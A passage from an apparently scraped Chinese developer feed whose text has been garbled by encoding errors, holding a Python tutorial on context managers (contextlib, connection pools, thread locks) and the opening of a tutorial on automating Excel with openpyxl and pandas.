        self.connection = <span class="hljs-literal">None</span>
        <span class="hljs-comment"># è‹¥éœ€æ•è·å¼‚å¸¸ï¼Œå¯åœ¨æ­¤å¤„ç†å¹¶è¿”å› True</span>
        <span class="hljs-comment"># if exc_type:</span>
        <span class="hljs-comment">#     print(f"æ•è·å¼‚å¸¸ï¼š{exc_val}")</span>
        <span class="hljs-comment">#     return True</span>

<span class="hljs-comment"># ä½¿ç”¨è‡ªå®šä¹‰ä¸Šä¸‹æ–‡ç®¡ç†å™¨</span>
<span class="hljs-keyword">with</span> DatabaseConnection(<span class="hljs-string">"test_db"</span>) <span class="hljs-keyword">as</span> conn:
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"ä½¿ç”¨è¿æ¥ï¼š<span class="hljs-subst">{conn}</span> æ‰§è¡ŒæŸ¥è¯¢"</span>)
<span class="hljs-comment"># è¾“å‡ºï¼š</span>
<span class="hljs-comment"># è¿æ¥æ•°æ®åº“ test_db</span>
<span class="hljs-comment"># ä½¿ç”¨è¿æ¥ï¼šDB_CONN_test_db æ‰§è¡ŒæŸ¥è¯¢</span>
<span class="hljs-comment"># å…³é—­æ•°æ®åº“ test_db çš„è¿æ¥</span>
</code></pre>
<h2 data-id="heading-4">ä¸‰ã€ç®€åŒ–å®ç°ï¼šcontextlib è£…é¥°å™¨</h2>
<p>å¯¹äºç®€å•çš„ä¸Šä¸‹æ–‡ç®¡ç†å™¨ï¼Œæ— éœ€ç¼–å†™å®Œæ•´çš„ç±»ï¼Œå¯ä½¿ç”¨Â <code>contextlib.contextmanager</code>Â è£…é¥°å™¨å°†ç”Ÿæˆå™¨å‡½æ•°è½¬æ¢ä¸ºä¸Šä¸‹æ–‡ç®¡ç†å™¨ã€‚</p>
<h3 data-id="heading-5">æ ¸å¿ƒé€»è¾‘</h3>
<ol>
<li>ç”Ÿæˆå™¨å‡½æ•°ä¸­ï¼Œ<code>yield</code>Â ä¹‹å‰çš„ä»£ç å¯¹åº”Â <code>__enter__</code>Â æ–¹æ³•ï¼ˆè·å–èµ„æºï¼‰ï¼›</li>
<li><code>yield</code>Â ä¹‹åçš„ä»£ç å¯¹åº”Â <code>__exit__</code>Â æ–¹æ³•ï¼ˆé‡Šæ”¾èµ„æºï¼‰ï¼›</li>
<li><code>yield</code>Â çš„å€¼ä¼šä½œä¸ºÂ <code>as</code>Â åçš„å˜é‡ã€‚</li>
</ol>
<h3 data-id="heading-6">ç¤ºä¾‹ï¼šæ–‡ä»¶æ“ä½œçš„ç®€åŒ–å®ç°</h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> contextlib <span class="hljs-keyword">import</span> contextmanager

<span class="hljs-meta">@contextmanager</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">open_file</span>(<span class="hljs-params">file_path, mode</span>):
    <span class="hljs-comment"># è·å–èµ„æºï¼ˆå¯¹åº” __enter__ï¼‰</span>
    f = <span class="hljs-built_in">open</span>(file_path, mode)
    <span class="hljs-keyword">try</span>:
        <span class="hljs-keyword">yield</span> f  <span class="hljs-comment"># è¿”å›èµ„æºç»™ as å˜é‡</span>
    <span class="hljs-keyword">finally</span>:
        <span class="hljs-comment"># é‡Šæ”¾èµ„æºï¼ˆå¯¹åº” __exit__ï¼‰</span>
        f.close()

<span class="hljs-comment"># ä½¿ç”¨ç®€åŒ–çš„ä¸Šä¸‹æ–‡ç®¡ç†å™¨</span>
<span class="hljs-keyword">with</span> open_file(<span class="hljs-string">"test.txt"</span>, <span class="hljs-string">"w"</span>) <span class="hljs-keyword">as</span> f:
    f.write(<span class="hljs-string">"Hello, Context Manager!"</span>)
<span class="hljs-comment"># æ–‡ä»¶ä¼šè¢«è‡ªåŠ¨å…³é—­ï¼Œæ— éœ€æ‰‹åŠ¨å¤„ç†</span>
</code></pre>
<h3 data-id="heading-7">ç¤ºä¾‹ï¼šä¸´æ—¶ä¿®æ”¹ç¯å¢ƒå˜é‡</h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> os
<span class="hljs-keyword">from</span> contextlib <span class="hljs-keyword">import</span> contextmanager

<span class="hljs-meta">@contextmanager</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">temp_env_var</span>(<span class="hljs-params">key, value</span>):
    <span class="hljs-comment"># ä¿å­˜åŸç¯å¢ƒå˜é‡</span>
    old_value = os.getenv(key)
    <span class="hljs-comment"># è®¾ç½®æ–°ç¯å¢ƒå˜é‡</span>
    os.environ[key] = value
    <span class="hljs-keyword">try</span>:
        <span class="hljs-keyword">yield</span>  <span class="hljs-comment"># æ— è¿”å›å€¼ï¼Œå¯çœç•¥ as</span>
    <span class="hljs-keyword">finally</span>:
        <span class="hljs-comment"># æ¢å¤åŸç¯å¢ƒå˜é‡</span>
        <span class="hljs-keyword">if</span> old_value <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:
            <span class="hljs-keyword">del</span> os.environ[key]
        <span class="hljs-keyword">else</span>:
            os.environ[key] = old_value

<span class="hljs-comment"># ä½¿ç”¨ç¤ºä¾‹</span>
<span class="hljs-built_in">print</span>(<span class="hljs-string">"ä¿®æ”¹å‰ï¼š"</span>, os.getenv(<span class="hljs-string">"TEST_KEY"</span>))  <span class="hljs-comment"># None</span>
<span class="hljs-keyword">with</span> temp_env_var(<span class="hljs-string">"TEST_KEY"</span>, <span class="hljs-string">"123456"</span>):
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"ä¿®æ”¹åï¼š"</span>, os.getenv(<span class="hljs-string">"TEST_KEY"</span>))  <span class="hljs-comment"># 123456</span>
<span class="hljs-built_in">print</span>(<span class="hljs-string">"æ¢å¤åï¼š"</span>, os.getenv(<span class="hljs-string">"TEST_KEY"</span>))  <span class="hljs-comment"># None</span>
</code></pre>
<h2 data-id="heading-8">å››ã€å®æˆ˜åœºæ™¯ï¼šå¸¸è§åº”ç”¨æ¡ˆä¾‹</h2>
<h3 data-id="heading-9">1. æ•°æ®åº“è¿æ¥æ± ç®¡ç†</h3>
<p>ä¸Šä¸‹æ–‡ç®¡ç†å™¨å¯ç¡®ä¿æ¯æ¬¡ä½¿ç”¨è¿æ¥åè‡ªåŠ¨å½’è¿˜åˆ°è¿æ¥æ± ï¼Œé¿å…è¿æ¥æ³„æ¼ï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> psycopg2
<span class="hljs-keyword">from</span> psycopg2 <span class="hljs-keyword">import</span> pool
<span class="hljs-keyword">from</span> contextlib <span class="hljs-keyword">import</span> contextmanager

<span class="hljs-comment"># åˆå§‹åŒ–è¿æ¥æ± </span>
conn_pool = pool.SimpleConnectionPool(
    minconn=<span class="hljs-number">1</span>,
    maxconn=<span class="hljs-number">5</span>,
    dbname=<span class="hljs-string">"test"</span>,
    user=<span class="hljs-string">"postgres"</span>,
    password=<span class="hljs-string">"123456"</span>,
    host=<span class="hljs-string">"localhost"</span>
)

<span class="hljs-meta">@contextmanager</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">get_db_conn</span>():
    conn = <span class="hljs-literal">None</span>
    <span class="hljs-keyword">try</span>:
        conn = conn_pool.getconn()
        <span class="hljs-keyword">yield</span> conn
    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
        <span class="hljs-keyword">if</span> conn:
            conn.rollback()
        <span class="hljs-keyword">raise</span> e
    <span class="hljs-keyword">finally</span>:
        <span class="hljs-keyword">if</span> conn:
            conn.commit()
            conn_pool.putconn(conn)

<span class="hljs-comment"># ä½¿ç”¨è¿æ¥æ± </span>
<span class="hljs-keyword">with</span> get_db_conn() <span class="hljs-keyword">as</span> conn:
    cursor = conn.cursor()
    cursor.execute(<span class="hljs-string">"SELECT * FROM users LIMIT 1;"</span>)
    <span class="hljs-built_in">print</span>(cursor.fetchone())
</code></pre>
<h3 data-id="heading-10">2. é”æœºåˆ¶çš„è‡ªåŠ¨é‡Šæ”¾</h3>
<p>åœ¨å¤šçº¿ç¨‹ç¼–ç¨‹ä¸­ï¼Œä¸Šä¸‹æ–‡ç®¡ç†å™¨å¯ç¡®ä¿é”è‡ªåŠ¨é‡Šæ”¾ï¼Œé¿å…æ­»é”ï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> threading
<span class="hljs-keyword">from</span> contextlib <span class="hljs-keyword">import</span> contextmanager

lock = threading.Lock()

<span class="hljs-meta">@contextmanager</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">thread_lock</span>():
    lock.acquire()
    <span class="hljs-keyword">try</span>:
        <span class="hljs-keyword">yield</span>
    <span class="hljs-keyword">finally</span>:
        lock.release()

<span class="hljs-comment"># å¤šçº¿ç¨‹ä¸­ä½¿ç”¨é”</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">worker</span>():
    <span class="hljs-keyword">with</span> thread_lock():
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"çº¿ç¨‹ <span class="hljs-subst">{threading.current_thread().name}</span> æŒæœ‰é”"</span>)
        <span class="hljs-comment"># æ‰§è¡Œçº¿ç¨‹å®‰å…¨çš„æ“ä½œ</span>

t1 = threading.Thread(target=worker, name=<span class="hljs-string">"t1"</span>)
t2 = threading.Thread(target=worker, name=<span class="hljs-string">"t2"</span>)
t1.start()
t2.start()
</code></pre>
<h2 data-id="heading-11">äº”ã€å…³é”®æ³¨æ„äº‹é¡¹</h2>
<ol>
<li>
<p><strong>å¼‚å¸¸å¤„ç†</strong>ï¼š<code>__exit__</code>Â æ–¹æ³•æˆ–Â <code>finally</code>Â å—å¿…é¡»å¤„ç†èµ„æºé‡Šæ”¾ï¼Œå³ä½¿ä»£ç å—æŠ›å‡ºå¼‚å¸¸ï¼›</p>
</li>
<li>
<p><strong>å¯é‡ç”¨æ€§</strong>ï¼šç±»å®ç°çš„ä¸Šä¸‹æ–‡ç®¡ç†å™¨å¯å®ä¾‹åŒ–å¤šæ¬¡ï¼Œç”Ÿæˆå™¨å®ç°çš„åˆ™æ¯æ¬¡è°ƒç”¨éƒ½æ˜¯æ–°çš„å®ä¾‹ï¼›</p>
</li>
<li>
<p><strong>åµŒå¥—ä½¿ç”¨</strong>ï¼šå¤šä¸ªä¸Šä¸‹æ–‡ç®¡ç†å™¨å¯åµŒå¥—åœ¨ä¸€ä¸ªÂ <code>with</code>Â è¯­å¥ä¸­ï¼Œç®€åŒ–ä»£ç ï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">"in.txt"</span>, <span class="hljs-string">"r"</span>) <span class="hljs-keyword">as</span> f_in, <span class="hljs-built_in">open</span>(<span class="hljs-string">"out.txt"</span>, <span class="hljs-string">"w"</span>) <span class="hljs-keyword">as</span> f_out:
    f_out.write(f_in.read())
</code></pre>
</li>
</ol>
<h2 data-id="heading-12">æ€»ç»“</h2>
<p>ä¸Šä¸‹æ–‡ç®¡ç†å™¨æ˜¯ Python ä¸­å¤„ç†èµ„æºçš„ã€Œä¼˜é›…æ–¹æ¡ˆã€ï¼Œå…¶æ ¸å¿ƒæ˜¯é€šè¿‡Â <code>__enter__</code>Â å’ŒÂ <code>__exit__</code>Â æ–¹æ³•ï¼ˆæˆ–Â <code>contextlib</code>Â è£…é¥°å™¨ï¼‰å®ç°èµ„æºçš„è‡ªåŠ¨è·å–ä¸é‡Šæ”¾</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Pythonå®ç°Excelæ•°æ®è‡ªåŠ¨åŒ–å¤„ç†ï¼šä»ç¹çæ“ä½œåˆ°æ™ºèƒ½æµç¨‹çš„èœ•å˜]]></title>    <link>https://juejin.cn/post/7589159665839636523</link>    <guid>https://juejin.cn/post/7589159665839636523</guid>    <pubDate>2025-12-29T07:58:13.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589159665839636523" data-draft-id="7588704463621537811" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Pythonå®ç°Excelæ•°æ®è‡ªåŠ¨åŒ–å¤„ç†ï¼šä»ç¹çæ“ä½œåˆ°æ™ºèƒ½æµç¨‹çš„èœ•å˜"/> <meta itemprop="keywords" content="Python"/> <meta itemprop="datePublished" content="2025-12-29T07:58:13.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ç«™å¤§çˆ·IP"/> <meta itemprop="url" content="https://juejin.cn/user/2905353241759261"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Pythonå®ç°Excelæ•°æ®è‡ªåŠ¨åŒ–å¤„ç†ï¼šä»ç¹çæ“ä½œåˆ°æ™ºèƒ½æµç¨‹çš„èœ•å˜
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2905353241759261/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ç«™å¤§çˆ·IP
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-29T07:58:13.000Z" title="Mon Dec 29 2025 07:58:13 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-29
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»8åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>â€‹</p>
<h2 data-id="heading-0">ä¸€ã€ä¸ºä»€ä¹ˆé€‰æ‹©Pythonå¤„ç†Excelæ•°æ®ï¼Ÿ</h2>
<p>ä¼ ç»ŸExcelæ“ä½œåƒåœ¨èµ°è¿·å®«ï¼šæ¯å¤©æ‰‹åŠ¨æ‰“å¼€20ä¸ªæ–‡ä»¶ï¼Œå¤åˆ¶ç²˜è´´æ•°æ®åˆ°æ±‡æ€»è¡¨ï¼Œå†æ‰‹åŠ¨è°ƒæ•´æ ¼å¼ã€åˆ é™¤ç©ºè¡Œã€è®¡ç®—ç»Ÿè®¡å€¼ã€‚å½“æ•°æ®é‡çªç ´ä¸‡è¡Œæ—¶ï¼Œè¿™ç§æ¨¡å¼æš´éœ²ä¸‰å¤§ç—›ç‚¹ï¼š</p>
<ol>
<li><strong>æ•ˆç‡ä½ä¸‹</strong>ï¼šå¤„ç†1000è¡Œæ•°æ®éœ€è¦2å°æ—¶ï¼Œé‡å¤æ“ä½œå å·¥ä½œæ—¶é—´çš„60%</li>
<li><strong>é”™è¯¯ç‡é«˜</strong>ï¼šäººå·¥æ“ä½œå®¹æ˜“æ¼é€‰å•å…ƒæ ¼ï¼ŒæŸé“¶è¡Œæ›¾å› æ‰‹åŠ¨æ±‡æ€»é”™è¯¯å¯¼è‡´æŠ¥è¡¨åå·®è¶…5%</li>
<li><strong>éš¾ä»¥å¤ç”¨</strong>ï¼šæ¯æ¬¡å¤„ç†æ–°æ•°æ®éƒ½è¦é‡æ–°æ“ä½œï¼Œæ— æ³•ç§¯ç´¯ç»éªŒå½¢æˆå¯å¤ç”¨æµç¨‹</li>
</ol>
<p>Pythonçš„<code>openpyxl</code>ã€<code>pandas</code>ç­‰åº“æä¾›è‡ªåŠ¨åŒ–è§£å†³æ–¹æ¡ˆï¼šç”¨30è¡Œä»£ç å°±èƒ½å®ŒæˆåŸæœ¬éœ€è¦2å°æ—¶çš„æ‰‹å·¥æ“ä½œï¼Œä¸”å‡†ç¡®ç‡æ¥è¿‘100%ã€‚æŸç”µå•†å…¬å¸å®è·µæ˜¾ç¤ºï¼ŒPythonè‡ªåŠ¨åŒ–å¤„ç†ä½¿æ•°æ®æ±‡æ€»æ—¶é—´ä»æ¯å¤©4å°æ—¶ç¼©çŸ­è‡³8åˆ†é’Ÿã€‚</p>
<h2 data-id="heading-1">äºŒã€ç¯å¢ƒå‡†å¤‡ï¼šæ­å»ºPython-Excelå¤„ç†å·¥å…·ç®±</h2>
<h3 data-id="heading-2">1. åŸºç¡€åº“å®‰è£…</h3>
<p>æ¨èä½¿ç”¨Anacondaç®¡ç†ç¯å¢ƒï¼Œå®‰è£…æ ¸å¿ƒåº“ï¼š</p>
<pre><code class="hljs">conda install openpyxl pandas xlrd xlwt xlsxwriter
</code></pre>
<p><img src="" alt="" title="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨" loading="lazy"/></p>
<p>å„åº“å®šä½ï¼š</p>
<ul>
<li><code>openpyxl</code>ï¼šè¯»å†™<code>.xlsx</code>æ–‡ä»¶ï¼Œæ”¯æŒæ ¼å¼è®¾ç½®</li>
<li><code>pandas</code>ï¼šæ•°æ®å¤„ç†æ ¸å¿ƒåº“ï¼Œé€‚åˆå¤§è§„æ¨¡æ•°æ®åˆ†æ</li>
<li><code>xlrd/xlwt</code>ï¼šè¯»å†™æ—§ç‰ˆ<code>.xls</code>æ–‡ä»¶ï¼ˆpandasä¾èµ–ï¼‰</li>
<li><code>xlsxwriter</code>ï¼šé«˜çº§Excelå†™å…¥åŠŸèƒ½ï¼ˆå¦‚å›¾è¡¨ã€æ¡ä»¶æ ¼å¼ï¼‰</li>
</ul>
<h3 data-id="heading-3">2. å¼€å‘å·¥å…·é€‰æ‹©</h3>
<ul>
<li><strong>Jupyter Notebook</strong>ï¼šé€‚åˆäº¤äº’å¼å¼€å‘ï¼Œå®æ—¶æŸ¥çœ‹å¤„ç†ç»“æœ</li>
<li><strong>PyCharm</strong>ï¼šé€‚åˆå¤§å‹é¡¹ç›®å¼€å‘ï¼Œæ”¯æŒä»£ç è°ƒè¯•</li>
<li><strong>VS Code</strong>ï¼šè½»é‡çº§ç¼–è¾‘å™¨ï¼Œå®‰è£…Pythonæ’ä»¶å³å¯ä½¿ç”¨</li>
</ul>
<h3 data-id="heading-4">3. æµ‹è¯•æ•°æ®å‡†å¤‡</h3>
<p>åˆ›å»ºåŒ…å«ä»¥ä¸‹å†…å®¹çš„æµ‹è¯•æ–‡ä»¶<code>test_data.xlsx</code>ï¼š</p>
<ul>
<li>Sheet1ï¼šé”€å”®æ•°æ®ï¼ˆæ—¥æœŸã€äº§å“ã€æ•°é‡ã€å•ä»·ï¼‰</li>
<li>Sheet2ï¼šå®¢æˆ·ä¿¡æ¯ï¼ˆå®¢æˆ·IDã€å§“åã€åœ°åŒºï¼‰</li>
<li>Sheet3ï¼šåº“å­˜æ•°æ®ï¼ˆäº§å“IDã€åº“å­˜é‡ã€é¢„è­¦å€¼ï¼‰</li>
</ul>
<h2 data-id="heading-5">ä¸‰ã€æ ¸å¿ƒæ“ä½œå®ç°ï¼šä»è¯»å–åˆ°å†™å…¥çš„å®Œæ•´æµç¨‹</h2>
<h3 data-id="heading-6">1. åŸºç¡€è¯»å†™æ“ä½œ</h3>
<p>ä½¿ç”¨<code>openpyxl</code>è¯»å–Excelï¼š</p>
<pre><code class="hljs language-ini" lang="ini">from openpyxl import load_workbook

<span class="hljs-comment"># åŠ è½½å·¥ä½œç°¿</span>
<span class="hljs-attr">wb</span> = load_workbook(<span class="hljs-string">'test_data.xlsx'</span>)

<span class="hljs-comment"># è·å–å·¥ä½œè¡¨</span>
<span class="hljs-attr">sheet</span> = wb[<span class="hljs-string">'Sheet1'</span>]

<span class="hljs-comment"># è¯»å–å•å…ƒæ ¼å€¼</span>
print(sheet<span class="hljs-section">['A1']</span>.value)  <span class="hljs-comment"># è¯»å–A1å•å…ƒæ ¼</span>
print(sheet.cell(<span class="hljs-attr">row</span>=<span class="hljs-number">2</span>, column=<span class="hljs-number">1</span>).value)  <span class="hljs-comment"># è¯»å–ç¬¬2è¡Œç¬¬1åˆ—</span>

<span class="hljs-comment"># éå†æ•°æ®</span>
for row in sheet.iter_rows(<span class="hljs-attr">min_row</span>=<span class="hljs-number">2</span>, values_only=<span class="hljs-literal">True</span>):
    print(row)  <span class="hljs-comment"># è¾“å‡ºæ¯è¡Œæ•°æ®ï¼ˆè·³è¿‡æ ‡é¢˜è¡Œï¼‰</span>
</code></pre>
<p><img src="" alt="" title="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨" loading="lazy"/></p>
<p>ä½¿ç”¨<code>pandas</code>è¯»å–ï¼ˆæ›´é«˜æ•ˆï¼‰ï¼š</p>
<pre><code class="hljs language-ini" lang="ini">import pandas as pd

<span class="hljs-comment"># è¯»å–æ•´ä¸ªå·¥ä½œç°¿</span>
<span class="hljs-attr">all_sheets</span> = pd.read_excel(<span class="hljs-string">'test_data.xlsx'</span>, sheet_name=None)
<span class="hljs-attr">sales_data</span> = all_sheets[<span class="hljs-string">'Sheet1'</span>]  <span class="hljs-comment"># è·å–é”€å”®æ•°æ®è¡¨</span>

<span class="hljs-comment"># è¯»å–æŒ‡å®šå·¥ä½œè¡¨</span>
<span class="hljs-attr">customer_data</span> = pd.read_excel(<span class="hljs-string">'test_data.xlsx'</span>, sheet_name=<span class="hljs-string">'Sheet2'</span>)

<span class="hljs-comment"># æ˜¾ç¤ºå‰5è¡Œ</span>
print(sales_data.head())
</code></pre>
<p><img src="" alt="" title="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨" loading="lazy"/></p>
<h3 data-id="heading-7">2. æ•°æ®æ¸…æ´—ä¸è½¬æ¢</h3>
<p>å¸¸è§æ¸…æ´—æ“ä½œï¼š</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-comment"># å¤„ç†ç¼ºå¤±å€¼</span>
sales_data.fillna(0, <span class="hljs-attr">inplace</span>=<span class="hljs-literal">True</span>)  <span class="hljs-comment"># å¡«å……ç¼ºå¤±å€¼ä¸º0</span>
<span class="hljs-comment"># æˆ–åˆ é™¤ç¼ºå¤±è¡Œ</span>
sales_data.dropna(<span class="hljs-attr">inplace</span>=<span class="hljs-literal">True</span>)

<span class="hljs-comment"># æ•°æ®ç±»å‹è½¬æ¢</span>
sales_data<span class="hljs-section">['å•ä»·']</span> = sales_data<span class="hljs-section">['å•ä»·']</span>.astype(float)
sales_data<span class="hljs-section">['æ—¥æœŸ']</span> = pd.to_datetime(sales_data<span class="hljs-section">['æ—¥æœŸ']</span>)

<span class="hljs-comment"># å­—ç¬¦ä¸²å¤„ç†</span>
sales_data<span class="hljs-section">['äº§å“']</span> = sales_data<span class="hljs-section">['äº§å“']</span>.str.strip()  <span class="hljs-comment"># å»é™¤ç©ºæ ¼</span>

<span class="hljs-comment"># åˆ é™¤é‡å¤å€¼</span>
sales_data.drop_duplicates(<span class="hljs-attr">subset</span>=[<span class="hljs-string">'è®¢å•å·'</span>], inplace=<span class="hljs-literal">True</span>)
</code></pre>
<p><img src="" alt="" title="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨" loading="lazy"/></p>
<h3 data-id="heading-8">3. æ•°æ®åˆ†æä¸è®¡ç®—</h3>
<p>åŸºç¡€ç»Ÿè®¡åˆ†æï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># è®¡ç®—é”€å”®æ€»é¢</span>
total_sales = (sales_data[<span class="hljs-string">'æ•°é‡'</span>] * sales_data[<span class="hljs-string">'å•ä»·'</span>]).<span class="hljs-built_in">sum</span>()
<span class="hljs-built_in">print</span>(<span class="hljs-string">f"æ€»é”€å”®é¢: <span class="hljs-subst">{total_sales:<span class="hljs-number">.2</span>f}</span>"</span>)

<span class="hljs-comment"># æŒ‰äº§å“åˆ†ç»„ç»Ÿè®¡</span>
product_stats = sales_data.groupby(<span class="hljs-string">'äº§å“'</span>).agg({
    <span class="hljs-string">'æ•°é‡'</span>: <span class="hljs-string">'sum'</span>,
    <span class="hljs-string">'å•ä»·'</span>: <span class="hljs-string">'mean'</span>
}).reset_index()

<span class="hljs-comment"># ç­›é€‰é«˜ä»·å€¼å®¢æˆ·</span>
